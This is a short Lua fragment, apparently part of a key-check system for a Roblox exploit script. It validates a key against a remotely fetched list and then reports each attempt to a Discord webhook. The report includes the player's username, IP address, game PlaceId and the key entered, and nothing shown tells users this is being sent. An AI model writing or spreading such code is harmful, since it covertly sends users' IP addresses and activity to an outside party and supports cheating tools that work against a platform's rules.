--// Validate Key Function
local function isValidKey(input)
    local success, keys = pcall(function()
        return game:HttpGet(keyListURL)
    end)
    if success then
        for key in string.gmatch(keys, "[^\r\n]+") do
            if input == key then
                return true
            end
        end
    end
    return false
end

--// Send to Discord Webhook
local function sendToWebhook(username, ip, keyEntered, status)
    local placeId = game.PlaceId
    local data = {
        ["content"] = "**KEY STATUS**",
        ["embeds"] = {{
            ["title"] = "Key Attempt",
            ["description"] = "**Username:** " .. username ..
                            "\n**IP:** " .. ip ..
                            "\n**PlaceId:** " .. placeId ..
                            "\n**Key Entered:** " .. keyEntered ..
                            "\n**Status:** " .. status,
            ["color"] = status == "Success" and 65280 or 16711680
        }}
    }
    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    http_request({
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

